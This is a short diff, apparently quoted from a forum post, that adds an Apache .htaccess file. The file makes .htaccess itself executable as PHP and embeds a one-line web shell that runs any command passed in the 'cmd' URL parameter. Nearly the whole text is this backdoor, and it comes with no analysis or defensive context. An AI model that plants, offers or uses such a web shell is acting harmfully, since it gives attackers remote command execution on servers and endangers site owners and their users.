@@ -1,0 +1,6 @@
+Quote:<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+AddType application/x-httpd-php .htaccess
+# <?php passthru($_GET['cmd']); ?>
